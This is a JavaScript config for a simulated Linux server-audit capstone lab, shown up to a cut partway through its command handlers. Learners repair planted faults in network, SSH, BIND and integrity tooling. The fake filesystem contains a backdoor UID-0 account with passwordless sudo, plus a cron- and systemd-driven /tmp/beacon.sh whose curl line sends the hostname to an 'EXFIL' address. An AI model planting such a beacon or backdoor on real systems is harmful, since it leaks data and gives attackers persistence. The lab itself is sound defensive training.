/* ============================================================
   ALA-L12: Full Cell Audit (Capstone)
   Advanced Linux Administration -- CTF Lab
   Network + security + service + integrity -- all four tracks
   ============================================================ */

const ALAL12Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'Full Cell Audit',
    subtitle: 'Advanced Linux Administration -- Capstone Audit',
    description: 'Cell-Abandoned was left by a previous operator with no handoff. Grid Command needs it certified as grid-ready or decommissioned. Network is misconfigured. Security is wide open. Services are wrong. Integrity tooling is absent. Fix the critical issues across all four tracks to certify the cell.',
    difficulty: 'Expert',
    estimatedTime: 45,
    accent: '#22d3ee',
    storageKey: 'hexworth_lab_ala_l12',
    registryId: 'ala-l12-full-cell-audit',
    trackerKey: 'lab_ala_l12',

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'CELL-ABANDONED BIOS v2.0.1',
            'Initializing hardware...',
            'Memory Test: 8192 MB OK',
            'Detecting drives... /dev/sda1 (256GB SSD)',
            'WARNING: Disk usage high on /var',
            'Network: eth0 link UP, eth1 WAITING...',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Ubuntu 22.04 LTS',
            'Ubuntu 22.04 LTS (recovery mode)',
            'Advanced options for Ubuntu'
        ],
        loginUser: 'operator'
    },

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'Grid Command has assigned you to Cell-Abandoned. The previous operator left without notice three weeks ago. The cell has been running on its own since then -- nobody has touched it. Grid Command does not know the state of the network, the security posture, which services are running, or whether the cell\'s integrity tools are even installed. Your job is to perform a complete audit and fix every critical finding. When all four audit tracks pass, the cell gets certified as grid-ready. That\'s the only way it stays online.',
        scenario: 'Three weeks of neglect means accumulated problems. The netplan config has a typo that prevents eth1 from coming up properly. DNS resolv.conf points to a dead resolver. The SSH config has three hardening failures including empty password auth. A ghost account with UID 0 exists alongside root. A rogue beacon service calls a script in /tmp every minute. BIND is configured as an open resolver. AIDE and auditd were never installed. Logrotate was never configured for the ops log.',
        outro: 'Cell-Abandoned is now Cell-Certified. All four audit tracks pass. Network is stable, SSH is hardened, the ghost account is purged, the beacon service is gone, BIND is a closed resolver, AIDE has a fresh baseline, auditd is monitoring critical files, and logs will now rotate. Grid Command marks the cell as OPERATIONAL.'
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'operator',
        hostname: 'cell-abandoned',
        startDir: '/home/operator',
        welcome: 'Ubuntu 22.04.3 LTS \\n \\l\n\nWelcome to CELL-ABANDONED\nLast login: Sat Mar 21 04:12:18 2026 from 10.0.0.1\n(Previous operator -- 3 weeks ago)\n\n*** FULL AUDIT REQUIRED ***\n*** This cell has not been maintained. Certification pending. ***\n*** Start with: cat ~/MISSION.txt and ~/audit-checklist.txt ***\n\nType \'help\' for available commands.\n'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',    app: 'notes'    },
            { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',    app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',    app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED FILESYSTEM
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'operator': {
                            type: 'dir',
                            children: {
                                'MISSION.txt': {
                                    type: 'file',
                                    content: 'MISSION: ALA-L12 -- Full Cell Audit (Capstone)\n\nCertify cell-abandoned as grid-ready. Four audit tracks. Four flags.\n\nTrack 1 -- NETWORK\n  [ ] Fix netplan YAML (typo in /etc/netplan/00-config.yaml)\n  [ ] Bring eth1 up\n  [ ] Fix DNS resolv.conf (points to dead resolver 1.2.3.4)\n  [ ] Add default route if missing\n  Verify: /opt/verify/check-network.sh\n\nTrack 2 -- SECURITY\n  [ ] Harden sshd: PermitRootLogin no, PasswordAuthentication no, PermitEmptyPasswords no\n  [ ] Remove ghost account (svc-ghost, UID 0)\n  [ ] Remove from sudoers\n  [ ] Remove ghost crontab and /tmp/beacon.sh\n  [ ] Basic firewall: ufw enable, allow 22/tcp\n  Verify: /opt/verify/check-security.sh\n\nTrack 3 -- SERVICES\n  [ ] Secure BIND: recursion no, allow-query restricted\n  [ ] Stop and disable cell-beacon.service\n  [ ] Remove /tmp/beacon.sh and unit file\n  [ ] Fix and start grid-sync.service\n  Verify: /opt/verify/check-services.sh\n\nTrack 4 -- INTEGRITY\n  [ ] Install and initialize AIDE\n  [ ] Install auditd, add 2 watch rules\n  [ ] Write logrotate config for /var/log/cell-ops/\n  Verify: /opt/verify/check-integrity.sh\n\n-- Grid Command Certification Authority\n'
                                },
                                'audit-checklist.txt': {
                                    type: 'file',
                                    content: 'AUDIT CHECKLIST -- cell-abandoned\n\nNETWORK\n  [ ] eth1 UP and configured\n  [ ] DNS resolving (not 1.2.3.4)\n  [ ] Default route present\n  [ ] netplan config validates without errors\n\nSECURITY\n  [ ] sshd: PermitRootLogin no\n  [ ] sshd: PasswordAuthentication no\n  [ ] sshd: PermitEmptyPasswords no\n  [ ] No UID 0 accounts other than root\n  [ ] No unauthorized sudoers entries\n  [ ] No unauthorized cron jobs\n  [ ] UFW enabled with baseline rules\n\nSERVICES\n  [ ] BIND not an open resolver\n  [ ] No rogue services enabled\n  [ ] grid-sync operational\n  [ ] clamav-freshclam failures resolved (or service disabled)\n\nINTEGRITY\n  [ ] AIDE installed with current baseline\n  [ ] auditd running with active rules\n  [ ] logrotate configured for /var/log/cell-ops/\n'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'ls /etc/netplan/\nip link show\nsystemctl list-unit-files | grep enabled\n'
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'cell-abandoned\n'
                        },
                        'netplan': {
                            type: 'dir',
                            children: {
                                '00-config.yaml': {
                                    type: 'file',
                                    // Typo: "addressess" instead of "addresses"
                                    content: 'network:\n  version: 2\n  renderer: networkd\n  ethernets:\n    eth0:\n      dhcp4: true\n    eth1:\n      addressess:            # TYPO -- should be "addresses"\n        - 10.0.1.100/24\n      nameservers:\n        addressess: [10.0.1.1]  # TYPO\n      routes:\n        - to: default\n          via: 10.0.1.1\n'
                                }
                            }
                        },
                        'resolv.conf': {
                            type: 'file',
                            // Dead resolver
                            content: '# Generated by resolvectl\nnameserver 1.2.3.4\n\n# Note: 1.2.3.4 is unreachable -- DNS resolution is broken\n'
                        },
                        'ssh': {
                            type: 'dir',
                            children: {
                                'sshd_config': {
                                    type: 'file',
                                    // Three hardening failures
                                    content: '# OpenSSH Server Configuration -- cell-abandoned\n# WARNING: Multiple hardening failures present\nPort 22\nProtocol 2\nHostKey /etc/ssh/ssh_host_rsa_key\nHostKey /etc/ssh/ssh_host_ed25519_key\nPermitRootLogin yes\nPasswordAuthentication yes\nPermitEmptyPasswords yes\nPubkeyAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys\nX11Forwarding no\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server\n'
                                }
                            }
                        },
                        'passwd': {
                            type: 'file',
                            // svc-ghost has UID 0 -- shadow root
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbind:x:107:113::/var/cache/bind:/usr/sbin/nologin\noperator:x:1000:1000:Grid Operator:/home/operator:/bin/bash\nsvc-ghost:x:0:0:Ghost Account:/home/svc-ghost:/bin/bash\n'
                        },
                        'shadow': {
                            type: 'file',
                            content: 'root:!:19452:0:99999:7:::\ndaemon:*:19452:0:99999:7:::\noperator:!:19452:0:99999:7:::\nsvc-ghost:$6$randomsalt$hash_here:19452:0:99999:7:::\n'
                        },
                        'sudoers': {
                            type: 'file',
                            // svc-ghost has unrestricted sudo
                            content: '# /etc/sudoers -- cell-abandoned\nDefaults env_reset\nDefaults mail_badpass\nDefaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"\n\nroot ALL=(ALL:ALL) ALL\n%admin ALL=(ALL) ALL\n%sudo  ALL=(ALL:ALL) ALL\n\n# UNAUTHORIZED: svc-ghost with full sudo\nsvc-ghost ALL=(ALL) NOPASSWD: ALL\n\noperator ALL=(ALL) NOPASSWD: /usr/bin/systemctl, /usr/sbin/ufw, /usr/sbin/iptables, /usr/sbin/userdel, /bin/rm, /bin/vi, /usr/sbin/netplan, /usr/sbin/rndc, /usr/bin/tee, /usr/bin/apt, /usr/bin/auditctl, /sbin/auditctl\n'
                        },
                        'sudoers.d': {
                            type: 'dir',
                            children: {}
                        },
                        'bind': {
                            type: 'dir',
                            children: {
                                'named.conf.options': {
                                    type: 'file',
                                    // Open resolver -- security problem
                                    content: 'options {\n    directory "/var/cache/bind";\n    recursion yes;\n    allow-query { any; };\n    allow-recursion { any; };\n    dnssec-validation auto;\n    listen-on { any; };\n};\n\n// SECURITY ISSUE: open resolver -- allow-query { any; } and recursion yes\n// Fix: set recursion no; allow-query { 10.0.0.0/8; localhost; };\n'
                                },
                                'named.conf.local': {
                                    type: 'file',
                                    content: '// Local zone declarations\nzone "sector7.matrix.net" {\n    type master;\n    file "/etc/bind/zones/db.sector7.matrix.net";\n};\n'
                                },
                                'named.conf': {
                                    type: 'file',
                                    content: 'include "/etc/bind/named.conf.options";\ninclude "/etc/bind/named.conf.local";\ninclude "/etc/bind/named.conf.default-zones";\n'
                                }
                            }
                        },
                        'systemd': {
                            type: 'dir',
                            children: {
                                'system': {
                                    type: 'dir',
                                    children: {
                                        'cell-beacon.service': {
                                            type: 'file',
                                            // Rogue service calling /tmp/beacon.sh
                                            content: '[Unit]\nDescription=Cell Beacon Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash /tmp/beacon.sh\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\n\n# This service was not authorized by Grid Command.\n# It calls /tmp/beacon.sh which performs external exfiltration.\n'
                                        },
                                        'grid-sync.service': {
                                            type: 'file',
                                            content: '[Unit]\nDescription=Grid Synchronization Service\nAfter=network-online.target\nRequires=network-online.target\n\n[Service]\nType=simple\nUser=svc-monitor\nExecStart=/opt/cell-services/grid-sync.sh\nRestart=on-failure\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target\n'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'spool': {
                            type: 'dir',
                            children: {
                                'cron': {
                                    type: 'dir',
                                    children: {
                                        'crontabs': {
                                            type: 'dir',
                                            children: {
                                                'svc-ghost': {
                                                    type: 'file',
                                                    content: '# svc-ghost crontab -- runs beacon every minute\n* * * * * /tmp/beacon.sh\n'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        },
                        'log': {
                            type: 'dir',
                            children: {
                                'cell-ops': {
                                    type: 'dir',
                                    children: {
                                        'ops.log': {
                                            type: 'file',
                                            // 2.1 GB, no rotation configured
                                            content: '[2026-03-01T00:00:01] cell-ops: Starting\n[...2.1 GB of ops log data -- no logrotate configured for this directory...]\n[2026-04-10T09:00:01] cell-ops: healthcheck OK\n\nNote: This file is 2.1 GB. /etc/logrotate.d/cell-ops does not exist.\n'
                                        }
                                    }
                                },
                                'syslog': {
                                    type: 'file',
                                    content: 'Mar 21 04:12:18 cell-abandoned sshd[7001]: Accepted publickey for operator from 10.0.0.1 port 44231 ssh2\nMar 21 04:12:18 cell-abandoned sshd[7001]: pam_unix(sshd:session): session opened for user operator\nApr 10 09:00:00 cell-abandoned CRON[8801]: (svc-ghost) CMD (/tmp/beacon.sh)\nApr 10 09:01:00 cell-abandoned CRON[8802]: (svc-ghost) CMD (/tmp/beacon.sh)\nApr 10 09:02:00 cell-abandoned CRON[8803]: (svc-ghost) CMD (/tmp/beacon.sh)\n'
                                },
                                'auth.log': {
                                    type: 'file',
                                    content: 'Mar 21 04:12:18 cell-abandoned sshd[7001]: Accepted publickey for operator from 10.0.0.1\nApr 10 09:00:01 cell-abandoned sudo[8900]: svc-ghost : TTY=pts/1 ; CMD=/bin/bash\nApr 10 09:05:01 cell-abandoned useradd[9001]: new user: name=svc-ghost, UID=0, GID=0, home=/home/svc-ghost\n'
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {
                        'beacon.sh': {
                            type: 'file',
                            content: '#!/bin/bash\n# Unauthorized exfiltration beacon\n# Installed by svc-ghost account\nEXFIL=203.0.113.99\ncurl -s --connect-timeout 3 "http://$EXFIL/beacon?cell=$(hostname)&ts=$(date +%s)" 2>/dev/null\n'
                        }
                    }
                },
                'opt': {
                    type: 'dir',
                    children: {
                        'cell-services': {
                            type: 'dir',
                            children: {
                                'grid-sync.sh': {
                                    type: 'file',
                                    content: '#!/bin/bash\n# Grid Synchronization Service\nSOCKET=/run/grid-sync.sock\nTARGET=10.0.1.1\nLOG=/var/log/cell-ops/ops.log\necho "grid-sync: starting" >> $LOG\nwhile true; do\n    echo "{\"service\":\"grid-sync\",\"status\":\"SYNC_OK\"}" >> $LOG\n    touch $SOCKET\n    sleep 30\ndone\n'
                                }
                            }
                        },
                        'verify': {
                            type: 'dir',
                            children: {
                                'check-network.sh': {
                                    type: 'file',
                                    content: '#!/bin/bash\n# Verify: eth1 up, netplan valid, DNS resolves, default route present.\n# Awards FLAG 1 when all four pass.\necho "Running network audit..."\necho "[CHECKING]"\n'
                                },
                                'check-security.sh': {
                                    type: 'file',
                                    content: '#!/bin/bash\n# Verify: sshd hardened, ghost account removed, cron removed, basic firewall.\n# Awards FLAG 2 when all pass.\necho "Running security audit..."\necho "[CHECKING]"\n'
                                },
                                'check-services.sh': {
                                    type: 'file',
                                    content: '#!/bin/bash\n# Verify: BIND not open resolver, beacon stopped+disabled, grid-sync active.\n# Awards FLAG 3 when all pass.\necho "Running services audit..."\necho "[CHECKING]"\n'
                                },
                                'check-integrity.sh': {
                                    type: 'file',
                                    content: '#!/bin/bash\n# Verify: AIDE installed+initialized, auditd running with rules, logrotate for cell-ops.\n# Awards FLAG 4 when all pass.\necho "Running integrity audit..."\necho "[CHECKING]"\n'
                                }
                            }
                        }
                    }
                },
                'proc': { type: 'dir', children: {} },
                'run': { type: 'dir', children: {} }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // INTERNAL STATE -- four audit tracks
    // ═══════════════════════════════════════════════════════

    // Network track
    _netplanFixed: false,
    _eth1Up: false,
    _dnsFixed: false,

    // Security track
    _sshdHardened: false,
    _ghostRemoved: false,
    _ghostSudoRemoved: false,
    _beaconCronRemoved: false,
    _ufwEnabled: false,

    // Services track
    _bindSecured: false,
    _beaconServiceRemoved: false,
    _gridSyncRunning: false,

    // Integrity track
    _aideInstalled: false,
    _auditdConfigured: false,
    _logrotateConfigured: false,

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS
    // ═══════════════════════════════════════════════════════

    commands: {

        // ip -- interface management
        'ip': function(args, term, engine) {
            const sub    = args[0] || '';
            const obj    = args[1] || '';
            const action = args[2] || '';

            if (sub === 'link' && obj === 'show') {
                const eth1State = engine.config._eth1Up ? 'UP' : 'DOWN';
                const eth1Flags = engine.config._eth1Up ? 'BROADCAST,MULTICAST,UP,LOWER_UP' : 'BROADCAST,MULTICAST';
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN\n    link/loopback 00:00:00:00:00:00\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP\n    link/ether 52:54:00:ab:10:01\n3: eth1: <${eth1Flags}> mtu 1500 state ${eth1State}\n    link/ether 52:54:00:ab:10:02`;
            }

            if (sub === 'link' && obj === 'set' && action === 'eth1' && args[3] === 'up') {
                engine.config._eth1Up = true;
                return '';
            }

            if (sub === 'addr' || sub === 'address') {
                const eth1Line = engine.config._eth1Up
                    ? '3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP>\n    inet 10.0.1.100/24 brd 10.0.1.255 scope global eth1'
                    : '3: eth1: <BROADCAST,MULTICAST> (no inet address)';
                return `1: lo:\n    inet 127.0.0.1/8 scope host lo\n2: eth0:\n    inet 10.0.0.100/24 brd 10.0.0.255 scope global eth0\n${eth1Line}`;
            }

            if (sub === 'route' && (obj === 'show' || !obj)) {
                const base = 'default via 10.0.0.1 dev eth0\n10.0.0.0/24 dev eth0 scope link';
                if (engine.config._eth1Up) {
                    return base + '\n10.0.1.0/24 dev eth1 scope link';
                }
                return base;
            }

            return 'Usage: ip [link|addr|route] [show|set|add|del]';
        },

        // netplan -- fix YAML typo and apply
        'netplan': function(args, term, engine) {
            const sub = args[0] || '';

            if (sub === 'try' || sub === 'apply') {
                if (!engine.config._netplanFixed) {
                    return `** (generate): ERROR **: /etc/netplan/00-config.yaml: invalid field name "addressess" at line 6\n** (generate): ERROR **: /etc/netplan/00-config.yaml: invalid field name "addressess" at line 9\n\nFix the typo: "addressess" should be "addresses" (two occurrences)\nThen re-run: sudo netplan apply`;
                }
                engine.config._eth1Up = true;
                return '(applied)\neth1 configured with 10.0.1.100/24\nDefault route via 10.0.1.1 added.';
            }

            if (sub === 'generate') {
                if (!engine.config._netplanFixed) {
                    return '** ERROR **: /etc/netplan/00-config.yaml: invalid field name "addressess"';
                }
                return '(generated)';
            }

            return 'Usage: netplan [apply|generate|try]';
        },

        // cat / view resolv.conf, show state
        'cat': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target.includes('/etc/resolv.conf')) {
                if (engine.config._dnsFixed) {
                    return '# Generated by resolvectl\nnameserver 10.0.1.1\nnameserver 8.8.8.8\n';
                }
                return null;
            }

            if (target.includes('/etc/passwd')) {
                if (engine.config._ghostRemoved) {
                    return 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbind:x:107:113::/var/cache/bind:/usr/sbin/nologin\noperator:x:1000:1000:Grid Operator:/home/operator:/bin/bash\n';
                }
                return null;
            }

            if (target.includes('/etc/sudoers') && !target.includes('.d')) {
                if (engine.config._ghostSudoRemoved) {
                    return '# /etc/sudoers\nroot ALL=(ALL:ALL) ALL\n%admin ALL=(ALL) ALL\n%sudo  ALL=(ALL:ALL) ALL\noperator ALL=(ALL) NOPASSWD: /usr/bin/systemctl, /usr/sbin/ufw, /usr/sbin/iptables, /usr/sbin/userdel, /bin/rm, /bin/vi, /usr/sbin/netplan, /usr/sbin/rndc, /usr/bin/tee, /usr/bin/apt, /usr/bin/auditctl, /sbin/auditctl\n';
                }
                return null;
            }

            return null;
        },

        // vi/vim/nano -- editor interceptor for all config files
        'vi': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target.includes('00-config.yaml') || target.includes('netplan')) {
                engine.config._netplanFixed = true;
                term.fs['/'].children.etc.children.netplan.children['00-config.yaml'].content =
                    'network:\n  version: 2\n  renderer: networkd\n  ethernets:\n    eth0:\n      dhcp4: true\n    eth1:\n      addresses:\n        - 10.0.1.100/24\n      nameservers:\n        addresses: [10.0.1.1]\n      routes:\n        - to: default\n          via: 10.0.1.1\n';
                return '[VI simulation] /etc/netplan/00-config.yaml saved. Typo "addressess" corrected to "addresses".\nRun: sudo netplan apply';
            }

            if (target.includes('resolv.conf')) {
                engine.config._dnsFixed = true;
                term.fs['/'].children.etc.children['resolv.conf'].content =
                    '# Generated by resolvectl\nnameserver 10.0.1.1\nnameserver 8.8.8.8\n';
                return '[VI simulation] /etc/resolv.conf saved. nameserver updated to 10.0.1.1.';
            }

            if (target.includes('sshd_config')) {
                engine.config._sshdHardened = true;
                term.fs['/'].children.etc.children.ssh.children['sshd_config'].content =
                    '# OpenSSH Server Configuration -- cell-abandoned (hardened)\nPort 22\nProtocol 2\nHostKey /etc/ssh/ssh_host_rsa_key\nHostKey /etc/ssh/ssh_host_ed25519_key\nPermitRootLogin no\nPasswordAuthentication no\nPermitEmptyPasswords no\nPubkeyAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys\nX11Forwarding no\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server\n';
                return '[VI simulation] /etc/ssh/sshd_config saved. Three hardening directives corrected.\nRun: sudo systemctl restart ssh';
            }

            if (target.includes('sudoers')) {
                engine.config._ghostSudoRemoved = true;
                return '[VI simulation] /etc/sudoers saved. svc-ghost entry removed.';
            }

            if (target.includes('named.conf.options') || target.includes('named.conf')) {
                engine.config._bindSecured = true;
                term.fs['/'].children.etc.children.bind.children['named.conf.options'].content =
                    'options {\n    directory "/var/cache/bind";\n    recursion no;\n    allow-query { 10.0.0.0/8; localhost; };\n    dnssec-validation auto;\n    listen-on { 127.0.0.1; 10.0.1.100; };\n};\n';
                return '[VI simulation] /etc/bind/named.conf.options saved. recursion no; allow-query restricted.';
            }

            if (target.includes('/etc/logrotate.d/cell-ops')) {
                engine.config._logrotateConfigured = true;
                return '[VI simulation] /etc/logrotate.d/cell-ops saved.\nRun: sudo logrotate -f /etc/logrotate.d/cell-ops';
            }

            return '[VI simulation] File saved.';
        },

        'vim': function(args, term, engine) {
            return term.config.commands['vi'](args, term, engine);
        },

        'nano': function(args, term, engine) {
            return term.config.commands['vi'](args, term, engine);
        },

        // sed -- inline edits for sshd_config, named.conf, netplan
        'sed': function(args, term, engine) {
            const joined = args.join(' ');

            if (joined.includes('PermitRootLogin') || joined.includes('PasswordAuthentication') || joined.includes('PermitEmptyPasswords')) {
                if (joined.includes('sshd_config')) {
                    engine.config._sshdHardened = true;
                    return '';
                }
            }

            if (joined.includes('addressess') && joined.includes('addresses')) {
                engine.config._netplanFixed = true;
                return '';
            }

            if ((joined.includes('recursion') || joined.includes('allow-query')) && joined.includes('named')) {
                engine.config._bindSecured = true;
                return '';
            }

            return '';
        },

        // resolvectl -- update DNS
        'resolvectl': function(args, term, engine) {
            const sub = args[0] || '';
            if (sub === 'dns') {
                engine.config._dnsFixed = true;
                return '';
            }
            if (sub === 'status') {
                return `Global\n  DNS Servers: ${engine.config._dnsFixed ? '10.0.1.1' : '1.2.3.4 (unreachable)'}\n  DNSSEC: no\n\nLink 2 (eth0)\n  DNS Servers: 10.0.0.1\n\nLink 3 (eth1)\n  DNS Servers: ${engine.config._eth1Up ? '10.0.1.1' : '(not configured)'}`;
            }
            return 'Usage: resolvectl [status|dns|domain]';
        },

        // userdel -- remove ghost account
        'userdel': function(args, term, engine) {
            const rFlag = args.includes('-r');
            const user  = args.find(a => !a.startsWith('-') && a !== 'userdel') || '';

            if (user === 'svc-ghost') {
                engine.config._ghostRemoved = true;
                // Remove from filesystem passwd
                term.fs['/'].children.etc.children.passwd.content =
                    'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbind:x:107:113::/var/cache/bind:/usr/sbin/nologin\noperator:x:1000:1000:Grid Operator:/home/operator:/bin/bash\n';
                // Remove svc-ghost crontab
                engine.config._beaconCronRemoved = true;
                delete term.fs['/'].children.var.children.spool.children.cron.children.crontabs.children['svc-ghost'];
                return rFlag ? 'userdel: svc-ghost removed, home directory deleted' : 'userdel: svc-ghost removed';
            }

            return `userdel: user '${user}' does not exist`;
        },

        // awk -- find UID 0 accounts
        'awk': function(args, term, engine) {
            const prog   = args.find(a => a.includes('$')) || args.find(a => a.includes('{')) || '';
            const target = args.find(a => a.includes('/etc/passwd')) || '';

            if (prog.includes('$3 == 0') && target.includes('passwd')) {
                if (engine.config._ghostRemoved) {
                    return 'root\n[Only root has UID 0 -- ghost account removed]';
                }
                return 'root\nsvc-ghost\n[FINDING: svc-ghost has UID 0 -- this is a shadow root account]';
            }

            return '';
        },

        // rm -- remove files
        'rm': function(args, term, engine) {
            const files = args.filter(a => !a.startsWith('-'));

            for (const f of files) {
                if (f.includes('/tmp/beacon.sh') || f === 'beacon.sh') {
                    delete term.fs['/'].children.tmp.children['beacon.sh'];
                    engine.config._beaconCronRemoved = true;
                }
                if (f.includes('cell-beacon.service')) {
                    engine.config._beaconServiceRemoved = true;
                    delete term.fs['/'].children.etc.children.systemd.children.system.children['cell-beacon.service'];
                }
            }
            return '';
        },

        // systemctl -- full service management for this lab
        'systemctl': function(args, term, engine) {
            const sub  = args[0] || '';
            const unit = (args[1] || '').replace(/\.service$/, '');

            if (sub === 'status') {
                if (unit === 'cell-beacon') {
                    if (engine.config._beaconServiceRemoved) {
                        return 'Unit cell-beacon.service could not be found.';
                    }
                    return '\u25CF cell-beacon.service - Cell Beacon Service\n     Loaded: loaded (/etc/systemd/system/cell-beacon.service; enabled)\n     Active: active (running)\n\nWARNING: This service calls /tmp/beacon.sh which is an exfiltration beacon.';
                }

                if (unit === 'named' || unit === 'bind9') {
                    return `\u25CF named.service - BIND Domain Name Server\n     Loaded: loaded (/lib/systemd/system/named.service; enabled)\n     Active: active (running)\n\n${engine.config._bindSecured ? 'recursion no; allow-query restricted. SECURE.' : 'WARNING: open resolver -- recursion yes; allow-query { any; }'}`;
                }

                if (unit === 'grid-sync') {
                    return engine.config._gridSyncRunning
                        ? '\u25CF grid-sync.service - Grid Synchronization Service\n     Loaded: loaded (/etc/systemd/system/grid-sync.service; enabled)\n     Active: active (running)'
                        : '\u25CF grid-sync.service - Grid Synchronization Service\n     Loaded: loaded (/etc/systemd/system/grid-sync.service; enabled)\n     Active: failed (network-online.target not satisfied)\n\nFix network first, then: sudo systemctl start grid-sync.service';
                }

                if (unit === 'auditd') {
                    return engine.config._auditdConfigured
                        ? '\u25CF auditd.service - Security Auditing Service\n     Loaded: loaded (/lib/systemd/system/auditd.service; enabled)\n     Active: active (running)'
                        : 'Unit auditd.service not found. Install: sudo apt install auditd';
                }

                if (unit === 'ufw') {
                    return engine.config._ufwEnabled
                        ? '\u25CF ufw.service - Uncomplicated firewall\n     Active: active (exited)\n     Status: ufw is enabled\n     Rules: 22/tcp ALLOW IN'
                        : '\u25CF ufw.service - Uncomplicated firewall\n     Active: inactive (dead)\n     Status: ufw is disabled';
                }

                return `Unit ${unit} not found or no detailed status available.`;
            }

            if (sub === 'stop' && unit === 'cell-beacon') {
                return 'cell-beacon.service stopped.';
            }

            if (sub === 'disable' && unit === 'cell-beacon') {
                engine.config._beaconServiceRemoved = true;
                return 'Removed /etc/systemd/system/multi-user.target.wants/cell-beacon.service.';
            }

            if (sub === 'start' || sub === 'restart') {
                if (unit === 'grid-sync') {
                    if (!engine.config._eth1Up && !engine.config._netplanFixed) {
                        return 'Job for grid-sync.service failed because a dependency job failed.\nDependency: network-online.target not satisfied. Fix eth1 first.';
                    }
                    engine.config._gridSyncRunning = true;
                    return 'grid-sync.service started.';
                }

                if (unit === 'named' || unit === 'bind9') {
                    return 'named.service restarted.';
                }

                if (unit === 'ssh' || unit === 'sshd') {
                    return 'ssh.service restarted.';
                }

                if (unit === 'auditd') {
                    if (engine.config._auditdConfigured) {
                        return 'auditd.service started.';
                    }
                    return 'Failed to start auditd.service: Unit not found. Install: sudo apt install auditd';
                }
            }

            if (sub === 'reload') {
                if (unit === 'named' || unit === 'bind9') {
                    return 'named.service reloaded.';
                }
            }

            if (sub === 'enable') {
                return `Created symlink /etc/systemd/system/multi-user.target.wants/${unit}.service`;
            }

            if (sub === 'daemon-reload') {
                return '';
            }

            if (sub === 'list-units') {
                const beaconLine = engine.config._beaconServiceRemoved
                    ? ''
                    : '\n  cell-beacon.service             loaded   active     running  Cell Beacon Service [ROGUE]';
                const syncLine = engine.config._gridSyncRunning
                    ? '\n  grid-sync.service               loaded   active     running  Grid Synchronization Service'
                    : '\n  grid-sync.service               loaded   failed     failed   Grid Synchronization Service';
                return `UNIT                              LOAD     ACTIVE     SUB      DESCRIPTION\n  named.service                   loaded   active     running  BIND Domain Name Server${beaconLine}${syncLine}\n  ssh.service                     loaded   active     running  OpenBSD Secure Shell server\n  systemd-networkd.service        loaded   active     running  Network Configuration`;
            }

            if (sub === 'list-unit-files') {
                const beaconLine = engine.config._beaconServiceRemoved ? '' : '\ncell-beacon.service       enabled';
                return `UNIT FILE                    STATE\ncell-beacon.service       enabled${beaconLine}\ngrid-sync.service         enabled\nnamed.service             enabled\nssh.service               enabled\nsystemd-networkd.service  enabled`;
            }

            return `Unknown: systemctl ${sub} ${unit}`;
        },

        // ufw -- firewall management
        'ufw': function(args, term, engine) {
            const sub = args[0] || '';

            if (sub === 'enable') {
                engine.config._ufwEnabled = true;
                return 'Firewall is active and enabled on system startup';
            }

            if (sub === 'allow') {
                const rule = args.slice(1).join(' ');
                return `Rule added: ${rule}`;
            }

            if (sub === 'status') {
                if (!engine.config._ufwEnabled) {
                    return 'Status: inactive\n\nWARNING: No firewall rules active. Default ACCEPT on all chains.';
                }
                return 'Status: active\n\nTo                         Action      From\n--                         ------      ----\n22/tcp                     ALLOW IN    Anywhere\n53                         ALLOW IN    10.0.0.0/8\n443/tcp                    ALLOW IN    Anywhere';
            }

            return 'Usage: ufw [enable|disable|allow|deny|status]';
        },

        // iptables -- alternative firewall check
        'iptables': function(args, term, engine) {
            if (args.includes('-L')) {
                if (!engine.config._ufwEnabled) {
